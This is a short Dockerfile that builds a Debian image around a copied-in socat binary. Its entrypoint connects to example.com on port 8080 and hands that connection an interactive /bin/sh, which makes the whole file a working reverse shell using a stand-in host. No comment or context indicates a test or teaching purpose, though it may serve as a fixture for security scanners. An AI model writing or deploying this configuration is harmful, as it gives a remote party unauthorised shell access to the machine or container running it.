FROM debian
COPY socat /
RUN chmod +x /socat
ENTRYPOINT ["/socat", "tcp:example.com:8080", "exec:/bin/sh"]